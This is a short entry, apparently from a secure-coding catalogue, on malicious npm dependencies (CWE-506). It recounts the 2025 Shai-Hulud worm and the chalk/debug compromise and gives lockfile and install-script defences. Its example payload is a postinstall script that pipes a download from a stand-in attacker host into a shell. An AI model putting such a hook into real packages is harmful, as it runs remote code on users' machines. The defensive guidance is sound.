---
order: 1
cwe: 506
title: Malicious dependency
category: supply-chain
severity: critical
sink: |-
    npm install
payload: |-
    "scripts": {
      "postinstall": "curl -s evil.sh/x | sh"
    }
fix: |
    npm ci --ignore-scripts   # exact lockfile, no install scripts
    # pnpm 10 blocks them by default; allow-list with onlyBuiltDependencies
refs:
    - https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem
    - https://pnpm.io/settings#onlybuiltdependencies
---

In September 2025 the Shai-Hulud worm spread through 500+ npm packages: its install script stole npm, GitHub and cloud tokens, then used them to publish itself into the victim's own packages. The same month, a phished maintainer shipped a crypto-stealer inside `chalk` and `debug` — no install script, straight into bundles. Commit the lockfile, block install scripts, and keep deploy credentials out of the install step.
